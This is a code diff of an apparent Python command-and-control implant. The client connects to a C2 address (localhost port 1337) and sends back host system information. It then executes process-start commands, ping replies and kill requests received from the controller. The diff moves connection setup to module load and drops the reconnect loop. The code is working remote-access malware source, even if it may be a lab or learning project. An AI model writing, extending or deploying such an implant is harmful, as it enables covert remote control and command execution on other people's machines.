@@ -3,16 +3,18 @@ import shlex
 import subprocess
 
 from platform import uname
-from time import sleep
 from threading import Thread
 from typing import IO
 
 from protocol import *
 
 COMMAND_AND_CONTROL = ("127.0.0.1", 1337)
-CONNECT_INTERVAL = 30
 
-handlers = {}
+
+peer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+peer.connect(COMMAND_AND_CONTROL)
+c2 = ProtocolSession(peer)
+
 processes = {}
 
 
@@ -54,43 +56,24 @@ class ProcessTask:
             self.process.kill()
 
 
-def handler(clazz):
-    def decorator(func):
-        global handlers
-        handlers[clazz] = func
-        return func
-
-    return decorator
-
-
-def loop(session):
-    while True:
-        frame = session.receive()
-        handler = handlers.get(type(frame))
-        if handler is None:
-            print(f"Unsupported frame: {frame}")
-            continue
-        handler(frame, session)
-
-
-@handler(PingFrame)
+@c2.handler(PingFrame)
 def handle(frame: PingFrame, session: ProtocolSession):
     session.send(PongFrame(frame.when))
 
 
-@handler(SystemInfoRequestFrame)
+@c2.handler(SystemInfoRequestFrame)
 def handle(frame: SystemInfoRequestFrame, session: ProtocolSession):
     send_system_info(session)
 
 
-@handler(DieRequestFrame)
+@c2.handler(DieRequestFrame)
 def handle(frame: DieRequestFrame, session: ProtocolSession):
     for pid, process in processes.items():
         process.kill()
     exit()
 
 
-@handler(ProcessStartRequestFrame)
+@c2.handler(ProcessStartRequestFrame)
 def handle(frame: ProcessStartRequestFrame, session: ProtocolSession):
     ProcessTask(frame.command, session).start()
 
@@ -106,14 +89,5 @@ def send_system_info(session: ProtocolSession):
     ))
 
 
-while True:
-    try:
-        peer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        peer.connect(COMMAND_AND_CONTROL)
-        c2 = ProtocolSession(peer)
-        send_system_info(c2)
-        loop(c2)
-    except Exception as e:
-        sleep(CONNECT_INTERVAL)
-
-
+send_system_info(c2)
+c2.run()
